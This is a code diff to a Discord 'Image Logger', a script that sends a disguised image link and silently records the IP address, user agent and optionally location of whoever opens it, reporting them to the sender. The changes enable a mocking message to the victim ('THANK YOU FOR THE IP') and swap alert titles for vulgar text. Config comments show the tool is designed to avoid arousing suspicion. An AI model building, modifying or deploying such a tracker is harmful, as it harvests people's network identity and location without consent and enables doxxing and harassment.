@@ -26,8 +26,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "YOUR FUCKED BY ASHIHIRO ENJOY THE EDIT WHILE YOUR AT IT THOUGH THANK YOU FOR THE IP LOLOLO", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -98,9 +98,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "SHIRO IS BEATING HIS SH",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Image Logging** link was sent in a chat!\nCum IS DESTINED.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -143,9 +143,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "SHIRO HAS BUSTED",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A SOMEONE TICKLED A LIL TO MUCH**
 
 **Endpoint:** `{endpoint}`
             
